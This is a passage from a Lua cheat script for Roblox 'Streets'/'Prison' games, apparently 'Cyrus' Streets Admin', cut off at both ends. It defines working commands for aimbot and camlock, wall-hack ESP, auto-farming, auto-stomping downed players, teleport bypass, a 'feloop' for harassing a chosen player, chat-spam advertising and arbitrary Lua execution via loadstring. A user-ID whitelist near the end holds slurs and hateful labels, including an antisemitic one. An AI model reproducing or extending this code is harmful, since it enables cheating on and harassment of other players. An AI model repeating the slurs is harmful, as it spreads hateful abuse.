                Freecam = false
        end 
end,"freecam",{},"Allows you to \"free\" view the map")

AddCommand(function(Arguments)
        if Arguments[1] then 
        if Arguments[1]:lower() == "cash" then 
          farm("Cash")
        elseif Arguments[1]:lower() == "shotty" then 
          farm("Shotty")
        elseif Arguments[1]:lower() == "uzi" then 
          farm("Uzi")
        elseif Arguments[1]:lower() == "katana" then 
          farm("Katana")
        elseif Arguments[1]:lower() == "sawed off" or Arguments[1]:lower() == "sawed" then 
          farm("Sawed Off")
        elseif Arguments[1]:lower() == "all" then 
                  farm("All")
                elseif Arguments[1]:lower() == "auto" then 
                        if not AutoFarm then
                                farm("Cash")
                        end
                        local WChild = workspace:GetDescendants() 
                        for i = 1,#WChild do
                                if WChild[i]:IsA'Seat' then 
                                        WChild[i]:Destroy()
                                end
                        end
                        AutoFarm = not AutoFarm
        end
    end
end,"farm",{},"Grabs you stuff around the map (farm [shotty/cash/uzi/katana/sawed/all/auto] - auto is for cash")

AddCommand(function()
        ItemEsp = not ItemEsp
        if ItemEsp then 
                local ChildrenInMyAttic = workspace:GetChildren()
                for i = 1,#ChildrenInMyAttic do 
                        if ChildrenInMyAttic[i].Name == "RandomSpawner" then 
                                addBillBoardGui(ChildrenInMyAttic[i])
                        end
                end
        else 
                local WChild = workspace:GetChildren()
                for i = 1,#WChild do
                local BBGui = WChild[i]:FindFirstChildOfClass'BillboardGui'
                        if WChild[i].Name == "RandomSpawner" and BBGui then 
                                BBGui:Destroy()
                        end
                end
        end 
end,"itemesp",{},"Allows you to see where all the spawners are on the map through walls")

AddCommand(function(Arguments)
        if Arguments[1] then
                if Arguments[1]:lower() == "all" then notif("STOP IT","NO. JUST NO.",10,nil) return end 
                local Player = PlrFinder(Arguments[1]) 
                if Player ~= LP and Player and tostring(AimlockTarget) ~= tostring(Player) then
                        CheckCommand("esp "..Player.Name)
                        AimLock = true 
                        AimlockTarget = Player.Character
                        local Connection; -- Localized so that it is only accessible in this function (Otherwise it would be over-wrote every time this command was called and would never be disconnected)
                        Connection = Player.CharacterAdded:Connect(function(C)
                                if tostring(C) == tostring(AimlockTarget) then 
                                        AimlockTarget = C
                                else 
                                        Connection:Disconnect()
                                end 
                        end)
                        notif("AimlockTarget has been set to",AimlockTarget.Name,5,nil)
                end
        else
                AimLock = not AimLock
                notif("Aimlock","has been set to "..tostring(AimLock),5,"rbxassetid://1281284684")
        end
end,"aimlock",{"aim"},"Shoots your gun that is titled 75 degrees at the selected person (Aimlock [Player/nil/loop] - if nil click players to set the aimlock target to them (loop makes it so when they respawn it still locks on)")

local WhiteListedParts = {
        ['head'] = "Head";
        ['torso'] = "Torso";
        ['humanoidrootpart'] = "HumanoidRootPart";
        ['prediction'] = "Prediction";
}

AddCommand(function(Arguments)
        if Arguments[1] then
                if WhiteListedParts[Arguments[1]:lower()] then
                        TargetPart = WhiteListedParts[Arguments[1]:lower()]
                        updateSettings()
                        notif("AimTarget","has been set to "..TargetPart,5,"rbxassetid://1281284684")
                end
        end
end,"aimtarget",{},"Allows you to pick between a part for aimlock to target/prediction")

AddCommand(function(Arguments)
        if Arguments[1] and tonumber(Arguments[1]) then 
                AimbotVelocity = Arguments[1]
                updateSettings()
        end 
end,"aimvelocity",{},"Changes your aimbot prediction velocity default: 5")

AddCommand(function(Arguments)
        if Arguments[1] then 
                if Arguments[1] == "all" then 
                        local Players_ = Players:GetPlayers() 
                        for i = 1,#Players_ do 
                                if Players_[i] ~= LP and not table.find(EspTable,Players_[i].UserId) then
                                        table.insert(EspTable,Players_[i].UserId)
                                        if not UseDraw or Arguments[2] and Arguments[2]:lower() == "legacy" then 
                                                espPlayer(Players_[i],"Legacy")
                                        else 
                                                espPlayer(Players_[i])
                                        end
                                end
                        end
                else 
                        local Player = PlrFinder(Arguments[1])
                        if not Player then return end 
                        if Player ~= LP and not table.find(EspTable,Player.UserId) then
                                table.insert(EspTable,Player.UserId)
                                if not UseDraw or Arguments[2] and Arguments[2]:lower() == "legacy" then 
                                        espPlayer(Player,"Legacy")
                                else
                                        espPlayer(Player)
                                end
                        end
                end
        end
end,"esp",{},"allows you to see the player through walls (Esp [plr] legacy for the old esp (will default if you do NOT have drawing api)")

AddCommand(function(Arguments)
        if Arguments[1] and Arguments[2] then 
                if Arguments[1]:lower() == "line" then 
                        if Arguments[2]:lower() == "thickness" and Arguments[3] then 
                                DrawTable['Thickness'] = tonumber(Arguments[3])
                        elseif Arguments[2]:lower() == "transparency" and Arguments[3] then 
                                DrawTable['Transparency'] = tonumber(Arguments[3])
                        elseif Arguments[2]:lower() == "visible" then 
                                DrawTable['Visible'] = not DrawTable['Visible'] 
                        end 
                end
        end 
end,"espsettings",{},"Changes Drawing API esp settings")

AddCommand(function(Arguments)
        if Arguments[1] then 
        local Player = PlrFinder(Arguments[1])
        if not Player then return end
        local A = workspace:GetDescendants()
        table.remove(EspTable,Player.UserId)
                for i = 1,#A do
                        if string.sub(A[i].Name, 1, 5) == "[ESP]" and string.sub(A[i].Name, 6) == Player.Name then
                                A[i]:Destroy()
                        end
                end
                Unesp(Player)
        else
                local A = workspace:GetDescendants()
                EspTable = {}
                for i = 1,#A do
                        if string.sub(A[i].Name, 1, 5) == "[ESP]" then
                                A[i]:Destroy()
                        end
                end
                local P = Players:GetPlayers()
                for i = 1,#P do 
                        Unesp(P[i])
                end 
        end
end,"unesp",{},"Removes the esp on the player")

AddCommand(function()
        wait(0.5)
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by NotCyrusAtAll | Join the cord at nXcZH36","All")
end,"advertise",{},"Advertises my discord lol")

AddCommand(function()
        if GetChar():FindFirstChildOfClass'Tool' then 
                GetChar():FindFirstChildOfClass'Tool'.Parent = workspace.Terrain
        end
end,"droptool",{"drop"},"Drops your current tool")

AddCommand(function(Arguments)
        if Arguments[1] then 
                loadstring(table.concat(Arguments," "))()
        end 
end,"luacode",{"lua"},"Allows you to execute the Lua code you input")

AddCommand(function()
        AutoStomp = not AutoStomp
        notif("Command: AutoStomp","AutoStomp has been set to "..tostring(AutoStomp),5,"rbxassetid://1281284684")
end,"autostomp",{},"Turns On/Off AutoStomp")

AddCommand(function(Arguments)
        if Arguments[1] and Arguments[1]:lower() == "remove" then 
                if Arguments[2] then
                        local Player = PlrFinder(Arguments[2])
                        if Player and Player ~= LP then
                                for i,v in pairs(DontStompWhitelisted) do if Player.UserId == v then table.remove(DontStompWhitelisted,i) end end
                        end
                else 
                        DontStompWhitelisted = {}
                end
        else 
                local Player = PlrFinder(Arguments[1])
                if Player and Player ~= LP then 
                        table.insert(DontStompWhitelisted,Player.UserId)
                end 
        end
end,"autostompwhitelist",{},"Whitelists to autostomp so that it doesn't stomp them")

AddCommand(function(Arguments)
        if Arguments[1] and Arguments[1] == "legacy" then 
                if GetChar():FindFirstChild'Right Arm' then 
                        GetChar()['Right Arm']:Destroy()
                end
        else 
                local ToolTable,CurrentTools = {},LP.Backpack:GetChildren() 
                for i = 1,#CurrentTools do
                        local Tool = CurrentTools[i]
                        if Tool:IsA'Tool' then
                                ToolTable[#ToolTable + 1] = Tool 
                        end
                end 
                GetChar().ChildAdded:Connect(function(T)
                local TempTable;
                        if T:IsA'Tool' then 
                                if table.find(ToolTable,T) then return end
                                wait()
                                T.Parent = LP.Backpack 
                                table.insert(ToolTable,T)
                        end
                end)    
        end 
end,"antikill",{},"Turns on Anti FE kill for your current life")

AddCommand(function(Arguments)
        if Arguments[1] then 
                local Player = PlrFinder(Arguments[1])
                if Player and Player.Character then 
                        local PlayerChild = Player.Character:GetDescendants() 
                        for i = 1,#PlayerChild do
                                local v = PlayerChild[i]
                                if v:IsA'Sound' and v.Name == "SoundX" or v.Name == "son" then
                                        notif("Stole the Audio","From "..Player.Name.." check your exploits workspace folder",5,nil)
                                        writefile("AudioLog From "..Player.Name.." "..math.random(1,99)..".txt","Stolen ID: "..v.SoundId:match"%d+".." From: "..Player.Name)
                                end
                        end
                end
        end 
end,"steal",{},"Steals a persons audio")

AddCommand(function(Arguments)
        if Arguments[1] then 
        local Player = PlrFinder(Arguments[1])
                if Player then 
                        local FindDecal = workspace:FindFirstChild(Player.Name.."Spray")
                        if FindDecal and FindDecal:FindFirstChildOfClass'Decal' then 
                                writefile("DecalLog From "..Player.Name.." "..math.random(1,99)..".txt","Stolen Decal: "..tostring(FindDecal.Decal.Texture:match"%d+").." From: "..Player.Name)
                                notif("Stole the Decal","From "..Player.Name.." check your exploits workspace folder",5,nil)
                        end
                end
        end
end,"decalsteal",{},"Steals a persons decal")

AddCommand(function()
        AntiAfk = not AntiAfk
        notif("Command: AntiAfk","has been set to "..tostring(AntiAfk),5,"rbxassetid://1281284684")
end,"antiafk",{},"Stops you from being kicked from \"AFK\"")

AddCommand(function(Arguments)
        CamLocking = not CamLocking
        if Arguments[1] then
                local Player = PlrFinder(Arguments[1])
                if Player then 
                        CamlockPlayer = Player
                end
        end 
end,"camlock",{"lockcam","cl"},"Different type of aimbot (Uses camera instead of the remote)")

local RainbowTable1,RainbowTable2;
AddCommand(function()
        if game.PlaceId ~= 455366377 then notif("Wont work","you need to be on streets",5,nil) return end 
        RainbowHats = not RainbowHats
        RainbowTable1,RainbowTable2 = LP.PlayerGui.HUD.Clan.Group.cs:GetChildren(),{}
        local a = LP.PlayerGui.HUD.Clan.Group.Reps:GetChildren()
        for i = 1,#a do 
                if a[i]:IsA'TextButton' then 
                        RainbowTable2[#RainbowTable2 + 1] = a[i]
                end 
        end 
end,"rainbowhats",{},"complete autism lol")

AddCommand(function(Arguments)
        if game.PlaceId == 455366377 then notif("Wont work","Prison Only",5,nil) return end
        FeLoop = not FeLoop
        if FeLoop and not CanUseFeloop then
                wait(0.5)
                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("To use Feloop, Say 'K' In Chat -Dollar","All")
                local Chat = LP.Chatted:Wait()
                if Chat:lower() ~= "k" then LP:Kick('That answer is wrong.') else CanUseFeloop = true end
        end
        if Arguments[1] then
                FeLoop = true 
                local Player = PlrFinder(Arguments[1])
                if Player then 
                        GetChar():BreakJoints()
                        LoopPlayer = Player 
                end
        else
                LoopPlayer = nil
        end
end,"feloop",{},"First you were a skid, Now you're annoying with a simple use of this command!","[Player]")

AddCommand(function(Arguments)
        if Arguments[1] then 
                if Arguments[1]:lower() == "leftclick" then 
                        AimlockMode = "LeftClick"
                        updateSettings()
                elseif Arguments[1]:lower() == "rightclick" then 
                        AimlockMode = "RightClick"
                        updateSettings()
                elseif Arguments[1]:lower() == "nomouse" then 
                        AimlockMode = "NoMouse" 
                        updateSettings()
                else
                        notif("Not a mode","Either type leftclick,rightclick,nomouse")
                end
        end
end,"aimmode",{"aimlockmode"},"Sets aimmode [LeftClick/RightClick]")

AddCommand(function()
local Table = {}
        for i = 1,10 do 
                local Server = HttpService:JSONDecode(game:HttpGet("https://www.roblox.com/games/getgameinstancesjson?placeId="..game.PlaceId.."&startindex="..i)) -- OMG IP LOGGER IT DOES AN HTTP REQUEST - half of people on the streets lol
                for i = 1,#Server.Collection do 
                        Table[Server.Collection[i].Ping] = Server.Collection[i].Guid
                end
        end
        for i,v in pairs(Table) do
                if v ~= game.JobId then 
                        TeleportService:TeleportToPlaceInstance(game.PlaceId,v)
                        break
                end 
        end 
end,"serverhop",{},"Server hopping capabilities")


local function Temp()
local Table = {} 
        for i,v in pairs(CmdFrame:GetChildren()) do
                table.insert(Table,v.Text)
        end
        return Table 
end 

local WhitelistedOs = {
        ['durango'] = "Xbox";
        ['win32'] = "Windows";
        ['ios'] = "Apple";
        ['android'] = "Superior Android";
        ['osx'] = "Mac (GROSS)";
        ['windows_universal'] = "Windows 10 roblox"
}
UserInput.WindowFocusReleased:Connect(function()
    RobloxInForeground = false 
    UserInput.WindowFocused:Wait()
    RobloxInForeground = true 
end)

local Debounce = false -- this code gets uglier every day holy fuck I'm gonna have to re-write it again soon lmao
local function Stepped()
        if GodMode or FeLoop then 
                if LP.Character:FindFirstChild'Right Leg' then 
                        LP.Character['Right Leg']:Destroy()
                end
        end
local PartFound = LP.Character:FindFirstChild'HumanoidRootPart' or LP.Character:FindFirstChild'Torso'
        if Noclipping then 
                local CDescendant = LP.Character:GetDescendants() 
                for i = 1,#CDescendant do 
                        if CDescendant[i]:IsA'Part' then 
                                CDescendant[i].CanCollide = false
                        end
                end
        end
        if flying and LP.Character:FindFirstChild'Humanoid' and not Debounce then
                Debounce = true
                LP.Character.Humanoid:ChangeState(3)
                wait(0.2)
                Debounce = false
        end 
        if RainbowHats and LP.Backpack:FindFirstChild'Stank' then 
                LP.Backpack.Stank:FireServer("rep",RainbowTable2[math.random(1,#RainbowTable2)])
                LP.Backpack.Stank:FireServer("color",RainbowTable1[math.random(1,#RainbowTable1)])
        end
        if TpBypass and LP.Character:FindFirstChild'RealHumanoidRootPart' then 
                LP.Character:FindFirstChild'RealHumanoidRootPart':Destroy() 
        end 
        if ClockTime then 
                Lighting.ClockTime = ClockTime 
        end
        if FeLoop and CanUseFeloop then
                local BChild = LP.Backpack:GetChildren()
        for i = 1,#BChild do 
            BChild[i].Parent = LP.Character
            if game.PlaceId == 455366377 then 
                repeat wait() until not LP.Character:FindFirstChildOfClass'Tool'
            end
                end
                if PartFound and LoopPlayer and LoopPlayer.Character and LoopPlayer.Character:FindFirstChild'Torso' then 
                        PartFound.CFrame = LoopPlayer.Character.Torso.CFrame
                end 
        end
        if AutoStomp then
                local Players = Players:GetPlayers()
                for i = 1,#Players do
                        if Players[i] ~= LP and Players[i].Character and Players[i].Character:FindFirstChild'Head' and Players[i].Character:FindFirstChild'Torso' and not Players[i]:IsFriendsWith(LP.UserId) then
                                if (PartFound.Position - Players[i].Character.Torso.Position).magnitude < 50  and Players[i].Character:FindFirstChild'KO' and Players[i].Character.Humanoid.Health > 0 and not LP.Character:FindFirstChild'KO' and LP.Character.Humanoid.Health > 0  and not Players[i]:FindFirstChild'Dragged' and not table.find(DontStompWhitelisted,Players[i].UserId) then
                                        PartFound.CFrame = CFrame.new(Players[i].Character.Torso.Position)
                                        LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack:FindFirstChild'Punch' or LP.Character:FindFirstChild'Punch')
                                end
                        end
                end
        end
        if AirWalkOn and LP.Character:FindFirstChild'Humanoid' and PartFound then 
                LP.Character.Humanoid.HipHeight = 0
                AirWalk.CFrame = PartFound.CFrame * CFrame.new(0,-3.5,0)
        end
        if CamLocking and CamlockPlayer and CamlockPlayer.Character and CamlockPlayer.Character:FindFirstChild'Torso' then 
                workspace.CurrentCamera.CoordinateFrame = CFrame.new(workspace.CurrentCamera.CoordinateFrame.p,CamlockPlayer.Character.Head.CFrame.p)
        end
    for i = 1,#PlayerTable do
                local Player,TopLeft,TopRight,BottomLeft,BottomRight = PlayerTable[i][1],PlayerTable[i][2],PlayerTable[i][3],PlayerTable[i][4],PlayerTable[i][5]
                local Text,Tracer,IsUser = PlayerTable[i][6],PlayerTable[i][7],PlayerTable[i][8]
                 if Player and Player.Character and Player.Character:FindFirstChild'Head' and LP.Character and LP.Character:FindFirstChild'Head' then 
                         local Part = Player.Character:FindFirstChild'HumanoidRootPart' or Player.Character:FindFirstChild'Torso'
                         if Part then
                                 local Cframe = Part.CFrame
                                 local h = Player.Character.Head.Size.Y / 2
                                 local Size = Vector3.new(2,3,0) * (h * 2)
                                 local RelativeHeadPos,TextOnScreen = workspace.CurrentCamera:WorldToViewportPoint(Player.Character.Head.Position)
                                 local TopLeftPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(Size.X,Size.Y,0)).p)
                                 local TopRightPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(-Size.X,Size.Y,0)).p)
                                 local BottomLeftPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(Size.X,-Size.Y,0)).p)
                                 local BottomRightPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(-Size.X,-Size.Y,0)).p)
                                 if RobloxInForeground then 
                                         TopLeft.Visible = TextOnScreen
                                         TopRight.Visible = TextOnScreen
                                         BottomLeft.Visible = TextOnScreen
                                         BottomRight.Visible = TextOnScreen
                                         if DrawTable['Visible'] then 
                                                 Tracer.Visible = TextOnScreen
                                         else 
                                                Tracer.Visible = false
                                         end 
                                         Text.Visible = TextOnScreen
                                 else 
                                         TopLeft.Visible = false
                                         TopRight.Visible = false
                                         BottomLeft.Visible = false
                                         BottomRight.Visible = false
                                         Tracer.Visible = false
                                         Text.Visible = false
                                 end 
                                 if TextOnScreen and RobloxInForeground then
                                         Text.Position = Vector2.new(RelativeHeadPos.X,RelativeHeadPos.Y) + Vector2.new(0,-30)
                                         Text.Center = true
                                         Text.Color = EspColour
                                         Text.Text = Player.Name.." | Health: "..checkHp(Player.Character).." | Cy Admin User: "..IsUser.."\nHas: Glock "..hasItem(Player,"Glock").." | Shotty "..hasItem(Player,"Shotty").." | Vest "..hasItem(Player,"BulletResist")
                                         TopLeft.From = Vector2.new(TopLeftPos.X,TopLeftPos.Y)
                                         TopLeft.To = Vector2.new(TopRightPos.X,TopRightPos.Y)
                                         TopRight.From = Vector2.new(TopRightPos.X,TopRightPos.Y)
                                         TopRight.To = Vector2.new(BottomRightPos.X,BottomRightPos.Y)
                                         BottomLeft.From = Vector2.new(BottomLeftPos.X,BottomLeftPos.Y)
                                         BottomLeft.To = Vector2.new(TopLeftPos.X,TopLeftPos.Y)
                                         BottomRight.From = Vector2.new(BottomRightPos.X,BottomRightPos.Y)
                                         BottomRight.To = Vector2.new(RelativeHeadPos.X,RelativeHeadPos.Y)
                                         if tostring(Player) == tostring(AimlockTarget) or tostring(Player) == tostring(CamlockPlayer) then 
                                                Tracer.Color = Color3.fromRGB(144,0,0)
                                         else 
                                                Tracer.Color = DrawTable['LineColour']
                                         end
                                         Tracer.Thickness = DrawTable['Thickness']
                                         Tracer.Transparency = DrawTable['Transparency']
                                         Tracer.From = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2,workspace.CurrentCamera.ViewportSize.X / 2 + 400)
                                         Tracer.To = Vector2.new(RelativeHeadPos.X,RelativeHeadPos.Y)
                                 end
                         end
                 end
         end 
end

local function CChildAdded(Thing)
        if Thing.Name == "KO" and AutoDie then 
                GetChar():BreakJoints()
        end
end

Cframe.BackgroundColor3 = Color3.new(0.666667,0,0)
Cframe.BackgroundTransparency = 0.20000000298023
Cframe.BorderSizePixel = 0
Cframe.Position = UDim2.new(0, 0, 1, 0)
Cframe.Size = UDim2.new(0, 270, 0, 35)

CText.BackgroundColor3 = Color3.new(0,0.000738177,0.000738177)
CText.BorderSizePixel = 0
CText.Position = UDim2.new(0, 5, 0, 5)
CText.Size = UDim2.new(0, 260, 0, 25)
CText.Font = Enum.Font.SourceSansLight
CText.Text = ""
CText.TextColor3 = Color3.new(1, 1, 1)
CText.TextScaled = true
CText.TextSize = 14
CText.TextWrapped = true

CmdFrame.BackgroundColor3 = Color3.new(0, 0.000738177, 0.000738177)
CmdFrame.BorderSizePixel = 0
CmdFrame.Position = UDim2.new(0, 0, -4, 0)
CmdFrame.Size = UDim2.new(1, 0, 4, 0)
CmdFrame.Visible = false

local function Create(Text)
if not Text then return end
        local CmdList = Instance.new("TextLabel",CmdFrame)
        CmdList.BackgroundColor3 = Color3.new(0.666667, 0, 0)
        CmdList.BackgroundTransparency = 0.20000000298023
        CmdList.BorderSizePixel = 0
        CmdList.Position = UDim2.new(-10, 0, 0, 0)
        CmdList.Size = UDim2.new(1, 0, 0, 20)
        CmdList.Font = Enum.Font.SourceSansLight
        CmdList.Text = Text
        CmdList.TextColor3 = Color3.new(0.952941, 0.952941, 0.952941)
        CmdList.TextScaled = true
        CmdList.TextWrapped = true
end

local function Changed()
pcall(function() 
        if CText.Text ~= "" then
                CmdFrame.Visible = true
                local PositionMatch = 0
                for _,cmd in pairs(CmdFrame:GetChildren()) do
                                if string.find(string.lower(cmd.Text),string.lower(CText.Text)) then
                                        cmd.Position = UDim2.new(0, 0, 0, 2 + (PositionMatch * 20))
                                        PositionMatch = PositionMatch + 1
                                        if cmd.Position == UDim2.new(0, 0, 0, 142) then
                                                cmd.Position = UDim2.new(-10, 0, 0, 0)
                                                PositionMatch = PositionMatch - 1
                                        end
                                else
                                        cmd.Position = UDim2.new(-10, 0, 0, 0)
                                end
                        end
                else
                        CmdFrame.Visible = false
                end
        end)
end

MainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
MainFrame.BackgroundTransparency = 0.250
MainFrame.BorderColor3 = Color3.fromRGB(128,0,128)
MainFrame.BorderSizePixel = 8
MainFrame.Position = UDim2.new(0,695,0,297)
MainFrame.Size = UDim2.new(0,495,0,431)
MainFrame.AnchorPoint = Vector2.new(0,0)
MainFrame.Visible = false 
MainFrame.Active = true 
MainFrame.Draggable = true 

ScrollingFrame.BackgroundColor3 = Color3.fromRGB(128,0,128)
ScrollingFrame.BackgroundTransparency = 0.400
ScrollingFrame.BorderColor3 = Color3.fromRGB(0,0,0)
ScrollingFrame.BorderSizePixel = 5
ScrollingFrame.Position = UDim2.new(0.0880542845,0,0.126374945,0)
ScrollingFrame.Size = UDim2.new(0,411,0,348)

SearchBar.BackgroundColor3 = Color3.fromRGB(128,0,128)
SearchBar.BackgroundTransparency = 0.400
SearchBar.BorderColor3 = Color3.fromRGB(0,0,0)
SearchBar.BorderSizePixel = 5
SearchBar.Position = UDim2.new(0.0880542994,0,0.0598471165,0)
SearchBar.Size = UDim2.new(0,411,0,28)
SearchBar.Font = Enum.Font.SourceSansBold
SearchBar.PlaceholderColor3 = Color3.fromRGB(255,255,255)
SearchBar.Text = "Search"
SearchBar.TextColor3 = Color3.fromRGB(128, 0, 128)
SearchBar.TextSize = 24.000

Credits.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Credits.BackgroundTransparency = 0.250
Credits.BorderColor3 = Color3.fromRGB(53, 2, 2)
Credits.BorderSizePixel = 5
Credits.Position = UDim2.new(-0.00101006031,0,0.948468387,0)
Credits.Size = UDim2.new(0,187,0,22)
Credits.Font = Enum.Font.SourceSansBold
Credits.Text = "UI Design by !fishgang Karma#9669"
Credits.TextColor3 = Color3.fromRGB(255,255,255)
Credits.TextSize = 14.000

DmgIndicator.BackgroundColor3 = Color3.fromRGB(0,0,0)
DmgIndicator.BackgroundTransparency = 0.700
DmgIndicator.BorderSizePixel = 3
DmgIndicator.Position = UDim2.new(0,0,1.00488257,0)
DmgIndicator.Size = UDim2.new(0,385,0,50)
DmgIndicator.Font = Enum.Font.SourceSans
DmgIndicator.Text = ''
DmgIndicator.TextColor3 = Color3.fromRGB(128,0,128)
DmgIndicator.TextScaled = true
DmgIndicator.TextSize = 30.000
DmgIndicator.TextWrapped = true
DmgIndicator.Visible = false 

local function CreateCommand(Pos,Text)
        local ActualCommands = Instance.new('TextLabel',ScrollingFrame)
        ActualCommands.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
        ActualCommands.BackgroundTransparency = 0.200
        ActualCommands.BorderColor3 = Color3.fromRGB(53, 2, 2)
        ActualCommands.Position = Pos
        ActualCommands.Size = UDim2.new(0, 382, 0, 20)
        ActualCommands.Font = Enum.Font.SourceSansBold
        ActualCommands.Text = Text
        ActualCommands.TextColor3 = Color3.fromRGB(128, 0, 128)
        ActualCommands.TextSize = 14.000
        ActualCommands.TextScaled = true 
        ActualCommands.TextWrapped = true
end

SearchBar.Changed:Connect(function()
local Index = 0
        if SearchBar.Text then
                for _,v in pairs(ScrollingFrame:GetChildren()) do
                        if not string.find(v.Text:lower(),SearchBar.Text:lower()) then
                                v.Visible = false
                        else
                                v.Visible = true
                                Index = Index + 1
                                v.Position = UDim2.new(0.0150422715,0,0.0127776451,0 + (Index * 20))
                        end
                end
        end
end)

local CoolkidTable = {
        ['300227703']   = {
                ['Name']   = "!fishgang Envy";
                ['Colour'] = Color3.fromRGB(125,0,0);
                ['Access'] = true;
        };
    ['590620847']       = {
                ['Name']   = "!fishgang Envy";
                ['Colour'] = Color3.fromRGB(125,0,0);
                ['Access'] = true;
        };
    ['714877']      = {
                ['Name']   = "!fishgang Ambiguity";
                ['Colour'] = Color3.fromRGB(57,52,52);
                ['Access'] = true;
        };
    ['96316322']    = {
                ['Name']   = "!fishgang Ambiguity";
                ['Colour'] = Color3.fromRGB(57,52,52);
                ['Access'] = true;
        };
    ['114164798']   = {
                ['Name']   = "!fishgang Slays | [RPF] Retard Prevention Force";
                ['Colour'] = Color3.fromRGB(0,255,255);
                ['Access'] = true;
        };
        ['359564044']   = {
                ['Name']   = "!fishgang 7w4c";
                ['Colour'] = Color3.fromRGB(255,255,255);
                ['Access'] = true;
        };
        ['659119329']   = {
                ['Name']   = "!fishgang Co-owner Cy | Creator of Cyrus' Streets Admin";
                ['Colour'] = Color3.fromRGB(212,224,255);
                ['Access'] = true;
        };
    ['659119329']   = {
                ['Name']   = "!fishgang Co-owner Cy Alt | Creator of Cyrus' Streets Admin";
                ['Colour'] = Color3.fromRGB(212,224,255);
                ['Access'] = true;
        };
        ['1388703832']  = {
                ['Name']   = "!fishgang Co-owner Cy Main | Creator of Cyrus' Streets Admin";
                ['Colour'] = Color3.fromRGB(212,224,255);
                ['Access'] = true;
        };
        ['62009114']    = {
                ['Name']   = "!fishgang Owner X_D6";
                ['Colour'] = Color3.fromRGB(176,16,16);
                ['Access'] = true;
        };
        ['57370993']    = {
                ['Name']   = "!fishgang Karma";
                ['Colour'] = Color3.fromRGB(255,0,0);
                ['Access'] = true;
        };
        ['20220183']    = {
                ['Name']   = "!fishgang Wya";
                ['Colour'] = Color3.fromRGB(215,19,19);
                ['Access'] = true;
        };
        ['1477162063']  = {
                ['Name'] = "!fishgang Wya (YFRWK)";
                ['Colour'] = Color3.fromRGB(192,6,6);
                ['Access'] = true;
        };
        ['105183043']   = {
                ['Name']   = "Drpoppadopolist | Drpoppa Creator";
                ['Colour'] = Color3.fromRGB(107,50,124);
                ['Access'] = true;
        };
        ['1190936']     = {
                ['Name']   = "trippinfo";
                ['Colour'] = Color3.fromRGB(12,4,134);
                ['Access'] = true;
        };
        ['378666469'] = {
                ['Name']   = "trippinfo";
                ['Colour'] = Color3.fromRGB(12,4,134);
                ['Access'] = true;
        };
        ['1443431439']  = {
                ['Name']   = "wk1r";
                ['Colour'] = Color3.fromRGB(194,23,255);
                ['Access'] = true;
        };
        ['164282612']   = {
                ['Name']   = "wk1r";
                ['Colour'] = Color3.fromRGB(194,23,255);
                ['Access'] = true;
        };
        ['1299915133']  = {
                ['Name']   = "wk1r";
                ['Colour'] = Color3.fromRGB(194,23,255);
                ['Access'] = true;
        };
        ['548617338']   = {
                ['Name']   = "Cool Person";
                ['Colour'] = Color3.fromRGB(36,89,237);
                ['Access'] = false;
        };
        ['1275692258']  = { 
                ['Name']   = "Gross a lynx member";
                ['Colour'] = Color3.fromRGB(125,0,0);
                ['Access'] = false;
        };
        ['612618136']   = { 
                ['Name']   = "Bird (Donator)";
                ['Colour'] = Color3.fromRGB(125,0,0);
                ['Access'] = false;
        };
        ['284761493']   = {
                ['Name']   = "[Strafe] XVE | voidbound.xyz";
                ['Colour'] = Color3.fromRGB(102,0,0);
                ['Access'] = true;
        };
        ['178560']      = {
                ['Name'] = "Literally a fucking egg.";
                ['Colour'] =  Color3.fromRGB(255,248,11);
                ['Access'] = false;
        };
        ['120476167']   = {
                ['Name']   = "Pawels Owner";
                ['Colour'] = Color3.fromRGB(52,152,219);
                ['Access'] = true;
        };
        ['120476167']   = {
                ['Name']   = "Pawels Owner";
                ['Colour'] = Color3.fromRGB(52,152,219);
                ['Access'] = true;
        };
        ['418171482']   = {
                ['Name'] = "Woman beater";
                ['Colour'] = Color3.fromRGB(255,0,70);
                ['Access'] = false;
        };
        ['710288902']   = {
                ['Name'] = "!fishgang Autism";
                ['Colour'] = Color3.fromRGB(0,255,0);
                ['Access'] = false;
        };
        ['383632734']   = {
                ['Name'] = "Dot_Mp4 phonk phonk rattle rattle supplier";
                ['Colour'] = Color3.fromRGB(255,0,0);
                ['Access'] = true;
        };
        ['1065069632424']  = {
                ['Name'] = "Aimcancel | Creator";
                ['Colour'] = Color3.fromRGB(178,242,255);
                ['Access'] = true;
        };
        ['39939779']    = {
                ['Name'] = "jewish overlord kill now";
                ['Colour'] = Color3.fromRGB(0,1,0);
                ['Access'] = true;
        };
        ['1528488185'] = {
                ['Name'] = "!fishgang Chronic (Oreo gangs #1 Hater)";
                ['Colour'] = Color3.fromRGB(235,31,31);
                ['Access'] = true;
        }
}
local Debounce = false 
local function ColourChanger(T)
        if T:IsA'Trail' and not CoolkidTable[tostring(LP.UserId)] then
                T.Color = BulletColour
        end
        if T:IsA'ObjectValue' and T.Name == "creator" and not Debounce then
                local Thing = T.Value
                local Method,Tool = Char(Thing)
                b(Thing.Name.." has "..Method.." from "..math.floor((GetChar().Head.Position - Thing.Head.Position).magnitude).." studs with a "..Tool.Name)
                if Tool.Name == "Shotty" then 
                        Debounce = true 
                        wait(0.7)
                        Debounce = false 
                end 
        end
end

local function HealthChanged(Health)
        if Health <= HealBotHealth and HealBot and not TpBypass then 
                if GrabThing("Burger",GetChar().Head.CFrame) then
                        local Hamborger = LP.Backpack:FindFirstChild'Burger'
                        if Hamborger then 
                                Hamborger.Parent = GetChar()
                                Hamborger:Activate() -- CHEEMS
                                repeat RunService.Heartbeat:Wait() until Hamborger.Parent ~= LP.Character
                        end
                end -- yeah I copy pasted it from my heal cmd DEAL WITH IT 
                if GrabThing("Drink",GetChar().Head.CFrame) then
                        local Drink = LP.Backpack:FindFirstChild'Drink'
                        if Drink then 
                                Drink.Parent = GetChar()
                                Drink:Activate()
                        end 
                end             
        end
end 

LP.CharacterAdded:Connect(function()
